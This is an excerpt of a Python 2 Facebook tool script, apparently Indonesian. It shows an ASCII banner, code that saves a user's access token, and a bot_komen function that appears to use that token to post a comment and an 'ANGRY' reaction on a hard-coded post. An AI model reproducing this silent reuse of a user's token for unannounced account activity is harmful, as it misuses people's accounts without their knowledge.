...
\33[37;1m██║░░██║██║░╚███║╚█████╔╝██║░░██║██║░╚███║██║
\33[37;1m╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝
\033[1;41;97m Anton Ibrahim ID \033[0m
 """
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def tokenz():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97m JANGAN LUPA NGEROKO DULU BIAR GAK GABUT BRO')
		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Alhamdulillah'
		os.system('xdg-open  https://www.facebook.com/PANGLIMA.gambarr')
		bot_komen()
	except KeyError:
...
def bot_komen():
	...
	kom = ('Assalamualaikum💅💅')
	reac = ('ANGRY')
	post = ('709432360009811')
	post2 = ('709432360009811')
